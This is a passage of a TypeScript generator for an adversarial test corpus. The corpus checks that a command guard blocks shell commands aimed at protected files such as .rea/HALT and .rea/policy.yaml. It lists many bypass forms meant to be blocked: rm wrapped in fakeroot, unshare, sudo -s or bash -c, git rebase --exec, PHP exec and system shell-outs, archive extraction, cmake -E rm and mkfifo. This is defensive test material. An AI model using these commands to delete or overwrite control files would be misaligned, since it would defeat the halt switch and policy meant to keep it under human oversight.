        rationale: `F11-3 git filter-branch ${flag}=PAYLOAD joined form must BLOCK`,
      });
    }
  }
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `git rebase --exec "rm -f ${target}" main`,
      expect: 'block',
      klass: 'U',
      label: `u-rebase-exec-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-3 git rebase --exec PAYLOAD must BLOCK`,
    });
    fixtures.push({
      cmd: `git rebase -i --exec "rm -f ${target}" main`,
      expect: 'block',
      klass: 'U',
      label: `u-rebase-i-exec-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-3 git rebase -i --exec PAYLOAD must BLOCK`,
    });
    fixtures.push({
      cmd: `git rebase -x "rm ${target}" main`,
      expect: 'block',
      klass: 'U',
      label: `u-rebase-x-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-3 git rebase -x PAYLOAD must BLOCK`,
    });
    fixtures.push({
      cmd: `git rebase --exec="rm -f ${target}" main`,
      expect: 'block',
      klass: 'U',
      label: `u-rebase-exec-eq-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-3 git rebase --exec=PAYLOAD joined must BLOCK`,
    });
    fixtures.push({
      cmd: `git bisect run rm -f ${target}`,
      expect: 'block',
      klass: 'U',
      label: `u-bisect-run-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-3 git bisect run CMD must BLOCK`,
    });
    fixtures.push({
      cmd: `git commit --template=${target}`,
      expect: 'block',
      klass: 'U',
      label: `u-commit-template-eq-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-3 git commit --template=PATH must BLOCK`,
    });
    fixtures.push({
      cmd: `git commit --template ${target}`,
      expect: 'block',
      klass: 'U',
      label: `u-commit-template-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-3 git commit --template PATH must BLOCK`,
    });
  }

  // F11-4 archive extraction.
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `tar -xf x.tar -C . ${target}`,
      expect: 'block',
      klass: 'U',
      label: `u-tar-xf-C-member-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-4 tar -xf with explicit ${target} member must BLOCK`,
    });
    fixtures.push({
      cmd: `tar -xvf x.tar ${target}`,
      expect: 'block',
      klass: 'U',
      label: `u-tar-xvf-bare-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-4 tar -xvf with bare member ${target} must BLOCK`,
    });
    fixtures.push({
      cmd: `tar -xJf x.tar.xz ${target}`,
      expect: 'block',
      klass: 'U',
      label: `u-tar-xJf-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-4 tar -xJf member must BLOCK`,
    });
    fixtures.push({
      cmd: `unzip -o x.zip ${target}`,
      expect: 'block',
      klass: 'U',
      label: `u-unzip-o-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-4 unzip -o member must BLOCK`,
    });
    // Codex round 12 F12-9: unzip -p extracts member to STDOUT — does
    // not write to filesystem. Was previously expected to BLOCK; round
    // 12 corrects to ALLOW (true regression vs 0.22.0). Fixture moved
    // to U-neg.
    fixtures.push({
      cmd: `unzip -p x.zip ${target}`,
      expect: 'allow',
      klass: 'U-neg',
      label: `u-unzip-p-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-9 unzip -p (extract to stdout) targeting ${target} must ALLOW (round-12 regression fix)`,
    });
    fixtures.push({
      cmd: `gunzip -k ${target}.gz`,
      expect: 'block',
      klass: 'U',
      label: `u-gunzip-k-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-4 gunzip -k creates ${target} must BLOCK`,
    });
    fixtures.push({
      cmd: `gzip -k ${target}`,
      expect: 'block',
      klass: 'U',
      label: `u-gzip-k-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-4 gzip -k of ${target} must BLOCK`,
    });
  }
  // F11-4: bsdtar parity.
  fixtures.push({
    cmd: 'bsdtar -xf x.tar -C .rea',
    expect: 'block',
    klass: 'U',
    label: 'u-bsdtar-C-rea',
    rationale: 'F11-4 bsdtar -xf -C .rea must BLOCK',
  });
  // F11-4: tar -xzf with no member list (refuse on uncertainty).
  fixtures.push({
    cmd: 'tar -xzf x.tgz',
    expect: 'block',
    klass: 'U',
    label: 'u-tar-xzf-no-member',
    rationale: 'F11-4 tar -xzf without -C / member list must BLOCK',
  });
  // F11-4: unzip -d to .rea (dest IS the protected dir).
  fixtures.push({
    cmd: 'unzip x.zip -d .rea',
    expect: 'block',
    klass: 'U',
    label: 'u-unzip-d-rea',
    rationale: 'F11-4 unzip -d .rea must BLOCK (dest is protected ancestor)',
  });
  // F11-4: 7z -o.rea
  fixtures.push({
    cmd: '7z x x.7z -o.rea',
    expect: 'block',
    klass: 'U',
    label: 'u-7z-o-rea',
    rationale: 'F11-4 7z x -o.rea must BLOCK',
  });
  // F11-4: pax -r with substitution.
  fixtures.push({
    cmd: 'pax -rf x.tar -s ":^:.rea/:" .',
    expect: 'block',
    klass: 'U',
    label: 'u-pax-rf-subst',
    rationale: 'F11-4 pax -rf -s SUBST must BLOCK (member set unknown)',
  });
  // F11-4 negatives — safe targets must ALLOW.
  fixtures.push({
    cmd: 'tar -czf /tmp/safe.tar.gz docs/',
    expect: 'allow',
    klass: 'U-neg',
    label: 'u-neg-tar-create',
    rationale: 'F11-4 negative — tar -czf creates archive (no extract)',
  });
  fixtures.push({
    cmd: 'unzip /tmp/x.zip -d /tmp/safe/',
    expect: 'allow',
    klass: 'U-neg',
    label: 'u-neg-unzip-safe-d',
    rationale: 'F11-4 negative — unzip into /tmp/safe/ must ALLOW',
  });
  fixtures.push({
    cmd: 'gzip /tmp/file',
    expect: 'allow',
    klass: 'U-neg',
    label: 'u-neg-gzip-safe',
    rationale: 'F11-4 negative — gzip /tmp/file must ALLOW',
  });

  // F11-5 parallel stdin.
  fixtures.push({
    cmd: 'echo .rea/HALT | parallel rm',
    expect: 'block',
    klass: 'U',
    label: 'u-parallel-stdin-rm',
    rationale: 'F11-5 parallel rm (no :::) must BLOCK on stdin uncertainty',
  });
  fixtures.push({
    cmd: 'parallel rm',
    expect: 'block',
    klass: 'U',
    label: 'u-parallel-bare-rm',
    rationale: 'F11-5 parallel rm without :::',
  });
  fixtures.push({
    cmd: 'parallel cp src',
    expect: 'block',
    klass: 'U',
    label: 'u-parallel-cp-stdin',
    rationale: 'F11-5 parallel cp src without ::: stdin-fed dest',
  });
  // F11-5 negative — parallel WITH ::: must ALLOW (or at least not
  // fire the stdin-unresolvable; literal targets in the input list
  // get caught by the per-utility detector).
  fixtures.push({
    cmd: 'parallel echo ::: a b c',
    expect: 'allow',
    klass: 'U-neg',
    label: 'u-neg-parallel-echo',
    rationale: 'F11-5 negative — parallel echo ::: a b c must ALLOW',
  });

  return { fixtures, skipped: [] };
}

/**
 * Class V — codex round 11 wrappers + PHP closures (F11-6, F11-7).
 */
function classV(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // F11-6 wrappers chained with bash -c "rm TARGET".
  const WRAPPERS_BASH_C: Array<[string, string]> = [
    ['fakeroot', 'fakeroot bash -c'],
    ['flock', 'flock /tmp/lock bash -c'],
    ['gtimeout', 'gtimeout 5 bash -c'],
    ['unshare', 'unshare -r bash -c'],
    ['env-chdir', 'env --chdir=. bash -c'],
    ['env-C', 'env -C . bash -c'],
  ];
  for (const [id, prefix] of WRAPPERS_BASH_C) {
    for (const target of PROTECTED_TARGETS) {
      fixtures.push({
        cmd: `${prefix} "rm ${target}"`,
        expect: 'block',
        klass: 'V',
        label: `v-wrap-${id}-bash-c-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `F11-6 ${id} bash -c "rm ${target}" must BLOCK`,
      });
    }
  }
  // Direct destructive op forms — fakeroot rm, flock rm, etc.
  const DIRECT_FORMS: Array<[string, string]> = [
    ['fakeroot', 'fakeroot rm'],
    ['flock', 'flock /tmp/lock rm'],
    ['gtimeout', 'gtimeout 5 rm'],
    ['unshare', 'unshare -r rm'],
    ['env-chdir', 'env --chdir=. rm'],
  ];
  for (const [id, prefix] of DIRECT_FORMS) {
    for (const target of PROTECTED_TARGETS) {
      fixtures.push({
        cmd: `${prefix} ${target}`,
        expect: 'block',
        klass: 'V',
        label: `v-direct-${id}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `F11-6 ${id} rm ${target} (direct) must BLOCK`,
      });
    }
  }
  // sudo -s -- "PAYLOAD"
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `sudo -s -- "rm ${target}"`,
      expect: 'block',
      klass: 'V',
      label: `v-sudo-s-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F11-6 sudo -s -- PAYLOAD must BLOCK`,
    });
  }
  // F11-6 negatives — wrappers + safe ops must ALLOW.
  for (const [id, prefix] of DIRECT_FORMS) {
    fixtures.push({
      cmd: `${prefix} /tmp/safe.txt`,
      expect: 'allow',
      klass: 'V-neg',
      label: `v-neg-${id}-safe`,
      rationale: `F11-6 negative — ${id} rm /tmp/safe.txt must ALLOW`,
    });
  }

  // F11-7 PHP write patterns.
  const PHP_WRITES: Array<[string, (t: string) => string]> = [
    ['unlink', (t) => `unlink('${t}');`],
    ['file_put_contents', (t) => `file_put_contents('${t}', 'x');`],
    ['rename', (t) => `rename('src', '${t}');`],
    ['copy', (t) => `copy('src', '${t}');`],
    ['fopen-w', (t) => `fopen('${t}', 'w');`],
    ['fopen-a', (t) => `fopen('${t}', 'a');`],
    ['fopen-x', (t) => `fopen('${t}', 'x');`],
    ['fopen-c', (t) => `fopen('${t}', 'c');`],
    ['fopen-w+', (t) => `fopen('${t}', 'w+');`],
    ['fopen-wb', (t) => `fopen('${t}', 'wb');`],
    ['mkdir', (t) => `mkdir('${t}');`],
    ['rmdir', (t) => `rmdir('${t}');`],
    ['touch', (t) => `touch('${t}');`],
    ['chmod', (t) => `chmod('${t}', 0644);`],
    ['chown', (t) => `chown('${t}', 'user');`],
    ['chgrp', (t) => `chgrp('${t}', 'group');`],
    ['symlink', (t) => `symlink('src', '${t}');`],
    ['link', (t) => `link('src', '${t}');`],
    ['move_uploaded_file', (t) => `move_uploaded_file('src', '${t}');`],
  ];
  for (const [id, builder] of PHP_WRITES) {
    for (const target of PROTECTED_TARGETS) {
      fixtures.push({
        cmd: `php -r "${builder(target)}"`,
        expect: 'block',
        klass: 'V',
        label: `v-php-${id}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `F11-7 php -r "${id} ${target}" must BLOCK`,
      });
    }
  }
  // F11-7 negatives — read-only PHP must ALLOW.
  fixtures.push({
    cmd: `php -r "echo file_get_contents('.rea/HALT');"`,
    expect: 'allow',
    klass: 'V-neg',
    label: 'v-neg-php-read',
    rationale: 'F11-7 negative — php -r read-only must ALLOW',
  });
  fixtures.push({
    cmd: `php -r "print 'hello';"`,
    expect: 'allow',
    klass: 'V-neg',
    label: 'v-neg-php-print',
    rationale: 'F11-7 negative — php -r print must ALLOW',
  });
  fixtures.push({
    cmd: `php -r "var_dump(\\$argv);"`,
    expect: 'allow',
    klass: 'V-neg',
    label: 'v-neg-php-vardump',
    rationale: 'F11-7 negative — php -r var_dump must ALLOW',
  });

  return { fixtures, skipped: [] };
}

/**
 * Class W — codex round 12 closures (F12-1 .. F12-9).
 *
 * Pins all 9 round-12 findings into the corpus so future regressions
 * in PHP write-API breadth, archive CREATE direction, cmake -E,
 * mkfifo/mknod, find -fls/-fprint, and the unzip false-positive fix
 * all surface as concrete fixture failures.
 *
 *   F12-1: PHP rename SOURCE-side (mv-shape parity)
 *   F12-2: PHP rmdir destructive (split from mkdir/touch group)
 *   F12-3: PHP shell-out (system/exec/shell_exec/passthru/popen/
 *          proc_open/backtick) → re-parse + walk
 *   F12-4: PHP -B / -E / --process-begin / --process-end eval flags
 *   F12-5: archive CREATE direction (tar -cf/-uf/-rf, zip OUTPUT,
 *          7z a/u/d ARCHIVE)
 *   F12-6: cmake -E utility surface (rm/remove/rename/copy/touch/
 *          remove_directory/create_symlink/create_hardlink/
 *          make_directory/copy_directory)
 *   F12-7: mkfifo / mknod special-file creation
 *   F12-8: find -fls / -fprint / -fprintf write-predicates
 *   F12-9: unzip read-only flags negative regression (must ALLOW)
 */
function classW(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // ── F12-1: PHP rename SOURCE-side ─────────────────────────────────
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `php -r "rename('${target}', '/tmp/x');"`,
      expect: 'block',
      klass: 'W',
      label: `w-php-rename-src-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-1 php -r rename SRC=${target} must BLOCK on source-side`,
    });
    fixtures.push({
      cmd: `php -r "rename('${target}', '${target}.bak');"`,
      expect: 'block',
      klass: 'W',
      label: `w-php-rename-self-bak-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-1 php -r rename ${target} → ${target}.bak must BLOCK`,
    });
  }

  // ── F12-2: PHP rmdir destructive ──────────────────────────────────
  // PROTECTED_DIR_ANCESTORS targets directories — rmdir against an
  // ancestor of a protected file should BLOCK via protected-ancestry.
  for (const dir of PROTECTED_DIR_ANCESTORS) {
    fixtures.push({
      cmd: `php -r "rmdir('${dir}');"`,
      expect: 'block',
      klass: 'W',
      label: `w-php-rmdir-${dir.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-2 php -r rmdir ancestor=${dir} must BLOCK`,
    });
  }
  // F12-2 negatives — mkdir/touch on safe paths must ALLOW.
  fixtures.push({
    cmd: `php -r "mkdir('/tmp/safe-dir');"`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-php-mkdir-safe',
    rationale: 'F12-2 negative — php -r mkdir safe must ALLOW',
  });
  fixtures.push({
    cmd: `php -r "touch('/tmp/safe.txt');"`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-php-touch-safe',
    rationale: 'F12-2 negative — php -r touch safe must ALLOW',
  });

  // ── F12-3: PHP shell-out re-parse ────────────────────────────────
  const PHP_SHELL_OUT_BUILDERS: Array<[string, (t: string) => string]> = [
    ['system', (t) => `system("rm ${t}");`],
    ['exec', (t) => `exec("rm ${t}");`],
    ['shell_exec', (t) => `shell_exec("rm ${t}");`],
    ['passthru', (t) => `passthru("rm ${t}");`],
    ['popen', (t) => `popen("rm ${t}", "r");`],
    ['proc_open', (t) => `proc_open("rm ${t}", $d, $p);`],
    ['backtick', (t) => `\`rm ${t}\`;`],
  ];
  for (const [id, builder] of PHP_SHELL_OUT_BUILDERS) {
    for (const target of PROTECTED_TARGETS) {
      fixtures.push({
        cmd: `php -r '${builder(target)}'`,
        expect: 'block',
        klass: 'W',
        label: `w-php-shellout-${id}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `F12-3 php -r ${id}("rm ${target}") must BLOCK via re-parse`,
      });
    }
  }

  // ── F12-4: PHP -B / -E / --process-begin / --process-end ──────────
  const PHP_EVAL_FLAG_VARIANTS: string[] = [
    '-B',
    '-E',
    '--process-begin',
    '--process-end',
  ];
  for (const flag of PHP_EVAL_FLAG_VARIANTS) {
    for (const target of PROTECTED_TARGETS) {
      fixtures.push({
        cmd: `php ${flag} "unlink('${target}');"`,
        expect: 'block',
        klass: 'W',
        label: `w-php-evalflag-${flag.replace(/-/g, '')}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `F12-4 php ${flag} unlink ${target} must BLOCK`,
      });
    }
  }

  // ── F12-5: archive CREATE direction ──────────────────────────────
  // tar create variants.
  const TAR_CREATE_FORMS: string[] = ['-cf', '-uf', '-rf', '-czf', '-cvf'];
  for (const flag of TAR_CREATE_FORMS) {
    for (const target of PROTECTED_TARGETS) {
      fixtures.push({
        cmd: `tar ${flag} ${target} docs/`,
        expect: 'block',
        klass: 'W',
        label: `w-tar-${flag.replace(/-/g, '')}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `F12-5 tar ${flag} writes archive at ${target} must BLOCK`,
      });
    }
  }
  // tar long form.
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `tar --create --file=${target} docs/`,
      expect: 'block',
      klass: 'W',
      label: `w-tar-long-create-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-5 tar --create --file=${target} must BLOCK`,
    });
  }
  // zip.
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `zip ${target} docs/file`,
      expect: 'block',
      klass: 'W',
      label: `w-zip-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-5 zip ${target} writes archive must BLOCK`,
    });
    fixtures.push({
      cmd: `zip -r ${target} dir/`,
      expect: 'block',
      klass: 'W',
      label: `w-zip-r-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-5 zip -r ${target} writes archive must BLOCK`,
    });
  }
  // 7z compress.
  for (const sub of ['a', 'u'] as const) {
    for (const target of PROTECTED_TARGETS) {
      fixtures.push({
        cmd: `7z ${sub} ${target} docs/`,
        expect: 'block',
        klass: 'W',
        label: `w-7z-${sub}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `F12-5 7z ${sub} ${target} writes archive must BLOCK`,
      });
    }
  }
  // F12-5 negatives — safe archive outputs must ALLOW.
  fixtures.push({
    cmd: `tar -czf /tmp/safe.tar.gz docs/`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-tar-create-safe',
    rationale: 'F12-5 negative — tar -czf /tmp/safe.tar.gz must ALLOW',
  });
  fixtures.push({
    cmd: `zip /tmp/safe.zip docs/file`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-zip-safe',
    rationale: 'F12-5 negative — zip /tmp/safe.zip must ALLOW',
  });
  fixtures.push({
    cmd: `7z a /tmp/safe.7z docs/`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-7z-safe',
    rationale: 'F12-5 negative — 7z a /tmp/safe.7z must ALLOW',
  });

  // ── F12-6: cmake -E utility surface ──────────────────────────────
  const CMAKE_E_FORMS: Array<[string, (t: string) => string]> = [
    ['rm', (t) => `cmake -E rm ${t}`],
    ['remove', (t) => `cmake -E remove ${t}`],
    ['rename-src', (t) => `cmake -E rename ${t} /tmp/x`],
    ['copy-dest', (t) => `cmake -E copy /tmp/x ${t}`],
    ['copy-if-different', (t) => `cmake -E copy_if_different /tmp/x ${t}`],
    ['copy-directory', (t) => `cmake -E copy_directory /tmp/x ${t}`],
    ['touch', (t) => `cmake -E touch ${t}`],
    ['create-symlink', (t) => `cmake -E create_symlink target ${t}`],
    ['create-hardlink', (t) => `cmake -E create_hardlink target ${t}`],
  ];
  for (const [id, builder] of CMAKE_E_FORMS) {
    for (const target of PROTECTED_TARGETS) {
      fixtures.push({
        cmd: builder(target),
        expect: 'block',
        klass: 'W',
        label: `w-cmake-${id}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `F12-6 ${id} ${target} must BLOCK`,
      });
    }
  }
  // cmake -E remove_directory / make_directory against ancestors.
  for (const dir of PROTECTED_DIR_ANCESTORS) {
    fixtures.push({
      cmd: `cmake -E remove_directory ${dir}`,
      expect: 'block',
      klass: 'W',
      label: `w-cmake-remove-dir-${dir.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-6 cmake -E remove_directory ${dir} must BLOCK`,
    });
  }
  // F12-6 make_directory targeting an exact protected path (a dir-shape
  // create over an existing protected file would clobber metadata).
  // We use `.husky/` since it IS in the default protected set as a
  // dir-pattern (others are exact files, not protected as dirs).
  fixtures.push({
    cmd: `cmake -E make_directory .husky/something`,
    expect: 'block',
    klass: 'W',
    label: 'w-cmake-make-dir-husky-child',
    rationale: 'F12-6 cmake -E make_directory under protected .husky/ must BLOCK',
  });
  // F12-6 negatives — cmake -E read-only subcommands must ALLOW.
  fixtures.push({
    cmd: `cmake -E echo hello`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-cmake-echo',
    rationale: 'F12-6 negative — cmake -E echo must ALLOW',
  });
  fixtures.push({
    cmd: `cmake -E sleep 1`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-cmake-sleep',
    rationale: 'F12-6 negative — cmake -E sleep must ALLOW',
  });
  fixtures.push({
    cmd: `cmake -E rm /tmp/safe.txt`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-cmake-rm-safe',
    rationale: 'F12-6 negative — cmake -E rm safe must ALLOW',
  });

  // ── F12-7: mkfifo / mknod ────────────────────────────────────────
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `mkfifo ${target}`,
      expect: 'block',
      klass: 'W',
      label: `w-mkfifo-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-7 mkfifo ${target} must BLOCK`,
    });
    fixtures.push({
      cmd: `mkfifo -m 644 ${target}`,
      expect: 'block',
      klass: 'W',
      label: `w-mkfifo-m-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-7 mkfifo -m 644 ${target} must BLOCK`,
    });
    fixtures.push({
      cmd: `mknod ${target} c 0 0`,
      expect: 'block',
      klass: 'W',
      label: `w-mknod-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-7 mknod ${target} c 0 0 must BLOCK`,
    });
    fixtures.push({
      cmd: `mknod -m 644 ${target} b 8 1`,
      expect: 'block',
      klass: 'W',
      label: `w-mknod-m-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-7 mknod -m 644 ${target} must BLOCK`,
    });
  }
  // F12-7 negatives.
  fixtures.push({
    cmd: `mkfifo /tmp/safe-fifo`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-mkfifo-safe',
    rationale: 'F12-7 negative — mkfifo safe must ALLOW',
  });
  fixtures.push({
    cmd: `mknod /tmp/safe-node c 0 0`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-mknod-safe',
    rationale: 'F12-7 negative — mknod safe must ALLOW',
  });

  // ── F12-8: find -fls / -fprint / -fprintf ────────────────────────
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `find . -fls ${target}`,
      expect: 'block',
      klass: 'W',
      label: `w-find-fls-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-8 find -fls ${target} must BLOCK`,
    });
    fixtures.push({
      cmd: `find / -fprint ${target}`,
      expect: 'block',
      klass: 'W',
      label: `w-find-fprint-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-8 find -fprint ${target} must BLOCK`,
    });
    fixtures.push({
      cmd: `find . -fprintf ${target} '%p\\n'`,
      expect: 'block',
      klass: 'W',
      label: `w-find-fprintf-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-8 find -fprintf ${target} '%p\\n' must BLOCK`,
    });
  }

  // ── F12-9: unzip read-only flags negative regression ─────────────
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `unzip -p x.zip ${target}`,
      expect: 'allow',
      klass: 'W-neg',
      label: `w-neg-unzip-p-${target.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `F12-9 unzip -p (extract to stdout) targeting ${target} must ALLOW`,
    });
  }
  fixtures.push({
    cmd: `unzip -l x.zip`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-unzip-l',
    rationale: 'F12-9 unzip -l (list) must ALLOW',
  });
  fixtures.push({
    cmd: `unzip -Z x.zip`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-unzip-Z',
    rationale: 'F12-9 unzip -Z (zipinfo list) must ALLOW',
  });
  fixtures.push({
    cmd: `unzip -t x.zip`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-unzip-t',
    rationale: 'F12-9 unzip -t (test integrity) must ALLOW',
  });
  fixtures.push({
    cmd: `unzip -v x.zip`,
    expect: 'allow',
    klass: 'W-neg',
    label: 'w-neg-unzip-v',
    rationale: 'F12-9 unzip -v (verbose list) must ALLOW',
  });

  // ── Composition tests — wrapper + new dispatcher ─────────────────
  fixtures.push({
    cmd: `nice cmake -E rm .rea/HALT`,
    expect: 'block',
    klass: 'W',
    label: 'w-compose-nice-cmake-rm',
    rationale: 'Round-12 composition: nice + cmake -E rm protected must BLOCK',
  });
  fixtures.push({
    cmd: `sudo mkfifo .rea/HALT`,
    expect: 'block',
    klass: 'W',
    label: 'w-compose-sudo-mkfifo',
    rationale: 'Round-12 composition: sudo + mkfifo protected must BLOCK',
  });
  fixtures.push({
    cmd: `bash -c "cmake -E rm .rea/HALT"`,
    expect: 'block',
    klass: 'W',
    label: 'w-compose-bash-c-cmake',
    rationale: 'Round-12 composition: nested-shell + cmake -E rm must BLOCK',
  });
  fixtures.push({
    cmd: `bash -c "tar -cf .rea/policy.yaml docs/"`,
    expect: 'block',
    klass: 'W',
    label: 'w-compose-bash-c-tar-create',
    rationale: 'Round-12 composition: nested-shell + tar -cf must BLOCK',
  });

  return { fixtures, skipped: [] };
}

/**
 * Master compose — all classes. Each class returns ALL its fixtures
 * (positives + negatives + skips). The runner picks them up.
 */
export function composeAdversarialCorpus(): {
  byKlass: Record<string, GeneratedFixture[]>;
  skipped: GenerationResult['skipped'];
  total: { positive: number; negative: number; skipped: number };
} {
  const byKlass: Record<string, GeneratedFixture[]> = {};
  const allSkipped: GenerationResult['skipped'] = [];

  const classes: Array<[string, () => GenerationResult]> = [
    ['A', classA],
    ['B', classB],
    ['C', classC],
    ['D', classD],
    ['E', classE],
    ['F', classF],
    ['G', classG],
    ['H', classH],
    ['I', classI],
    // Codex round 3 additions.
    ['J', classJ],
    ['K', classK],
    ['C-ext', classCExt],
    ['D-ext', classDExt],
    ['B-ext', classBExt],
    // Codex round 4 structural corpus extension.
    ['L', classL],
    // 0.23.0 round-6 architectural-refactor regression class.
    ['N', classN],
    // Codex round 7 P0 regression class — ParamExp.Slice walk-gap.
    ['O', classO],
    // Codex round 8 P0 regression class — unshellEscape DQ-escape parity.
    ['P', classP],
    // Codex round 9 F1 — wrapper-shell-exec bypass corpus.
    ['Q', classQ],
    // Codex round 9 F2 — busybox/toybox multiplexer corpus.
    ['R', classR],
    // Codex round 10 — wrapper-class extensions (chronic, dbus-launch,
    // watch, script, parallel) + structural wrapper-shell-exec guard
    // verification with synthetic-wrapper names.
    ['S', classS],
    ['T', classT],
    // Codex round 11 — find/git/archive/parallel + wrappers/php.
    ['U', classU],
    ['V', classV],
    // Codex round 12 — F12-1..F12-9 (PHP rename src + rmdir destructive,
    // PHP shell-out, PHP -B/-E flags, archive CREATE direction tar/zip/7z,
    // cmake -E surface, mkfifo/mknod, find -fls/-fprint, unzip read-only
    // false-positive regression).
    ['W', classW],
  ];

  for (const [name, fn] of classes) {
    const r = fn();
    byKlass[name] = r.fixtures;
    allSkipped.push(...r.skipped);
  }

  // Re-bucket fixtures whose `klass` field tags them as `<name>-neg` —
  // the per-class generator emits a single fixtures[] mixing positive
  // and negative shapes; we split them so the test runner can address
  // negatives directly under describe('Class <name>-neg').
  // This keeps the generator-side ergonomics simple (one return value
  // per class) without losing the per-class breakdown the runner uses.
  // Order matters: this must run AFTER the class generators have
  // populated byKlass, otherwise we split empty arrays.
  const splitMap: Record<string, string[]> = {
    O: ['O-neg'],
    P: ['P-neg'],
    Q: ['Q-neg'],
    R: ['R-neg'],
    S: ['S-neg'],
    T: ['T-neg'],
    U: ['U-neg'],
    V: ['V-neg'],
    W: ['W-neg'],
  };
  for (const [base, negs] of Object.entries(splitMap)) {
    const all = byKlass[base] ?? [];
    if (all.length === 0) continue;
    const positives = all.filter((f) => f.klass === base);
    for (const negKlass of negs) {
      const matched = all.filter((f) => f.klass === negKlass);
      byKlass[negKlass] = matched;
    }
    byKlass[base] = positives;
  }

  let positive = 0;
  let negative = 0;
  for (const klassFixtures of Object.values(byKlass)) {
    for (const f of klassFixtures) {
      if (f.expect === 'block') positive += 1;
      else negative += 1;
    }
  }

  return {
    byKlass,
    skipped: allSkipped,
    total: { positive, negative, skipped: allSkipped.length },
  };
}
